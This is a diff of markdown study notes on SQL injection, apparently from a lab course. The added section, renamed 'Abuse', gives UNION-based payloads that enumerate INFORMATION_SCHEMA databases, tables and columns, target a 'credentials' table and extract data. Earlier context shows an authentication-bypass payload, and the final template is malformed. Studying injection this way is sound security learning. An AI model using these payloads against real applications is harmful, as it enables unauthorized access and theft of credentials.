@@ -63,7 +63,7 @@ SELECT * FROM logins WHERE (username='test' OR id=5)-- AND password=test
 ```
 This get's us in because we changed the parenthetical `AND` into an `OR` and just entered an arbitrary ID, then commented out the rest of the query.
 
-## Enumeration
+## Abuse
 ### With `UNION`
 `UNION` statements can only work on select statements with the same number of columns.
 
@@ -110,4 +110,27 @@ test') union select 1,2,3,4-- -
 Or we can use `@@version` and cycle through our available columns to see which ones actually display the version:
 ```sql
 test') union select 1,@@version,3,4-- -
+```
+
+### Getting the Database Layout.
+Finding all of the DB's
+```sql
+cn' UNION select 1, schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
+# schema_name is the name of individual databases
+```
+
+Finding all the tables.
+```sql
+cn' UNION select 1, TABLE_NAME, TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<insert db name here'-- 
+# schema_name is the name of the table
+```
+
+Getting all of the columns.
+```sql
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
+```
+
+Getting the Data
+```sql
+test') UNION select 1,2,<column1,column2 from <dbname.table>
 ```
